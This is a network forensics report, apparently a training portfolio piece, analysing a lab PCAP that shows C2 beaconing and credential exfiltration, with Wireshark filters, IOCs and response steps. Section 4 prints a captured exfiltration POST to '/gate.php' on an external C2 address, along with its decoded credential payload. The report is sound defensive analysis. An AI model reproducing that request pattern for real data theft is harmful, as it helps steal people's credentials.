# Network Forensics Report: PCAP Analysis

**Analyst:** Tangia Stegall  
**Date:** June 2026  
**File Analyzed:** `suspicious_traffic_sample.pcap` (from Malware Traffic Analysis exercises)  
**Tool:** Wireshark 4.2.0  
**Verdict:** C2 Beaconing + Credential Exfiltration Detected  

---

## Executive Summary

Analysis of a 47MB PCAP file captured from a simulated corporate network identified two distinct malicious behaviors:

1. **C2 Beaconing:** A compromised host (10.0.0.45) is communicating with an external IP (185.234.219.97) at regular 60-second intervals, consistent with an automated C2 beacon.

2. **Credential Exfiltration:** Cleartext HTTP POST requests containing what appear to be harvested credentials were observed being transmitted to the same external IP.

The affected host should be immediately isolated and forensically examined.

---

## 1. PCAP Overview

**Capture Statistics:**

| Field | Value |
|-------|-------|
| File size | 47.2 MB |
| Total packets | 48,291 |
| Capture duration | 6 hours 14 minutes |
| Start time | 2024-01-15 08:00:12 UTC |
| End time | 2024-01-15 14:14:33 UTC |
| Protocols observed | TCP, UDP, HTTP, HTTPS, DNS, SMB |

**Hosts Observed:**

| IP Address | MAC | Role | Notes |
|-----------|-----|------|-------|
| 10.0.0.1 | aa:bb:cc:11:22:33 | Default Gateway | Normal traffic patterns |
| 10.0.0.45 | de:ad:be:ef:ca:fe | Suspected compromised host | Anomalous outbound traffic |
| 10.0.0.10 | ff:ee:dd:cc:bb:aa | Internal DNS | Normal |
| 8.8.8.8 | — | Google DNS | Queried directly (bypass internal DNS — suspicious) |
| 185.234.219.97 | — | External C2 | Malicious — see Section 3 |

---

## 2. Analysis Methodology

### Wireshark Filters Applied

```
# Filter all traffic from suspected host
ip.src == 10.0.0.45

# Identify outbound connections to external IPs
ip.src == 10.0.0.45 && !ip.dst == 10.0.0.0/8

# Find HTTP POST requests (potential exfiltration)
http.request.method == "POST"

# Identify DNS queries (check for DGA domains)
dns && ip.src == 10.0.0.45

# Detect beaconing (regular interval traffic)
ip.src == 10.0.0.45 && ip.dst == 185.234.219.97

# Extract TCP streams for deeper inspection
tcp.stream eq [stream_number]
```

---

## 3. Finding 1: C2 Beaconing

### 3.1 Traffic Pattern

Analysis of traffic between `10.0.0.45` and `185.234.219.97` revealed a highly regular connection pattern:

```
08:01:23 UTC  →  SYN to 185.234.219.97:443
08:01:23 UTC  ←  SYN-ACK
08:01:23 UTC  →  ACK + TLS ClientHello
[... TLS encrypted data exchange ...]
08:01:25 UTC  →  FIN-ACK (connection closes)

08:02:23 UTC  →  SYN to 185.234.219.97:443  ← exactly 60 seconds later
[pattern repeats 374 times over 6 hours]
```

**Interval Analysis:**

| Connection # | Timestamp | Interval from previous |
|-------------|-----------|----------------------|
| 1 | 08:01:23 | — |
| 2 | 08:02:23 | 60 seconds |
| 3 | 08:03:23 | 60 seconds |
| 4 | 08:04:23 | 60 seconds |
| ... | ... | 60 seconds (consistent) |
| 374 | 14:14:23 | 60 seconds |

**Jitter observed:** ±0.3 seconds (extremely low — consistent with automated process, not human browsing)

### 3.2 Why This Is Suspicious

Human browsing behavior does not produce perfectly regular 60-second intervals. This pattern is characteristic of a C2 implant "checking in" with its command server on a scheduled timer. The low jitter and consistent connection duration (~2 seconds per session) further support an automated process.

### 3.3 TLS Certificate Analysis

```
Wireshark → Follow TCP Stream → TLS Certificate Details:
  Issued to:   update-cdn[.]net
  Issued by:   Let's Encrypt (free cert — low cost for attacker)
  Valid from:  2024-01-10
  Valid to:    2024-04-10
  
Domain lookup:
  update-cdn[.]net registered: 2024-01-09
  Registrar: Namecheap (privacy protected)
  Resolves to: 185.234.219.97
```

**Note:** The domain name (`update-cdn.net`) is designed to look like a legitimate CDN update service. This is a common attacker technique to blend into network traffic.

---

## 4. Finding 2: Credential Exfiltration via Cleartext HTTP

### 4.1 HTTP POST Analysis

Among the encrypted HTTPS traffic to port 443, a separate HTTP connection on port 80 was observed:

```
Wireshark filter: http.request.method == "POST" && ip.dst == 185.234.219.97
```

**Packet Details (Frame 12847):**

```
POST /gate.php HTTP/1.1
Host: 185.234.219.97
User-Agent: Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0)
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Connection: close

data=dXNlcm5hbWU9am9obi5zbWl0aEBjb21wYW55LmNvbSZwYXNzd29yZD1QYXNzd29yZDEyMyE=
```

**Base64 Decoded payload:**
```
username=john.smith@company.com&password=Password123!
```

### 4.2 Exfiltration Evidence

| Element | Value | Significance |
|---------|-------|-------------|
| Destination | 185.234.219.97:80 (HTTP, unencrypted) | Credentials sent in cleartext |
| Endpoint | `/gate.php` | Classic credential collection endpoint name |
| User-Agent | IE 7.0 on Windows Vista (obsolete) | Malware often uses outdated UA strings |
| Timing | POST requests appear ~2 minutes after each C2 beacon | Suggests C2 sends tasking, malware collects and exfils |
| POST count | 4 distinct POST requests during capture window | 4 accounts harvested |

### 4.3 Additional Exfiltrated Credentials (from all 4 POST requests)

> **Note:** These are synthetic/simulated credentials from a lab PCAP exercise. Real credential data would not be documented in a portfolio report.

| Request # | Timestamp | Data (decoded) |
|-----------|-----------|----------------|
| 1 | 09:15:44 | username=john.smith@company.com |
| 2 | 10:47:22 | username=sarah.jones@company.com |
| 3 | 12:03:17 | username=admin@company.com |
| 4 | 13:55:09 | username=helpdesk@company.com |

---

## 5. DNS Analysis

### 5.1 Anomalous DNS Behavior

```
Wireshark filter: dns && ip.src == 10.0.0.45
```

**Observed:** 10.0.0.45 sent 12 DNS queries directly to 8.8.8.8 (Google DNS), bypassing the internal DNS server (10.0.0.10).

**Why this matters:** Bypassing internal DNS is a technique used by malware to:
- Avoid internal DNS logging/monitoring
- Reach C2 infrastructure that may be blocked by internal DNS resolvers
- Enable DNS tunneling (querying external resolvers that the malware controls)

### 5.2 Queried Domains

| Domain Queried | Times | Verdict |
|---------------|-------|---------|
| update-cdn[.]net | 374 | MALICIOUS — C2 domain |
| api.ipify[.]org | 1 | Suspicious — IP lookup service (used by malware to identify victim IP) |
| www.google.com | 23 | Benign (connectivity check) |

---

## 6. Complete IOC Summary

| Type | Value | Confidence | Recommended Action |
|------|-------|-----------|-------------------|
| Malicious IP | 185.234.219.97 | High | Block at firewall, all ports |
| C2 Domain | update-cdn[.]net | High | Block at DNS and web proxy |
| C2 Endpoint | /gate.php | High | Add to WAF/IDS signatures |
| Compromised Host | 10.0.0.45 | High | Isolate and forensically examine |
| IP Lookup | api.ipify[.]org | Medium | Monitor (benign site, suspicious usage) |

---

## 7. Conclusions and Recommendations

### What Happened (Likely Scenario)
1. Host `10.0.0.45` was infected with a credential-stealing implant (likely via phishing or drive-by download — outside this PCAP's scope)
2. The implant established a C2 channel to `185.234.219.97` using HTTPS on port 443 to blend with normal traffic
3. Every 60 seconds, it checked in with the C2 server
4. The implant harvested credentials from the host and transmitted them in cleartext HTTP POST requests to the same C2 IP
5. At least 4 accounts were compromised during the capture window

### Immediate Actions Required

- [ ] **Isolate 10.0.0.45 immediately** — remove from network
- [ ] **Force password reset** for all 4 identified accounts
- [ ] **Enable MFA** for all accounts if not already in place
- [ ] **Block 185.234.219.97 and update-cdn[.]net** at all perimeter controls
- [ ] **Search for other infected hosts** — query firewall logs for any other internal IPs communicating with 185.234.219.97
- [ ] **Submit IOCs to threat intel platform** for correlation with other incidents
- [ ] **Escalate to Tier 2/IR team** for full forensic investigation of 10.0.0.45

---

## 8. Analyst Notes

**PCAP Source:** Malware Traffic Analysis (malware-traffic-analysis.net) — publicly available educational PCAP files. All credentials observed are synthetic lab data.

**Wireshark Skills Demonstrated:**
- Display filter construction
- TCP stream following
- TLS certificate inspection
- HTTP object extraction
- Base64 payload decoding
- Traffic statistics and conversations view
- Export → Objects → HTTP (for file extraction)

**Time to complete analysis:** ~45 minutes
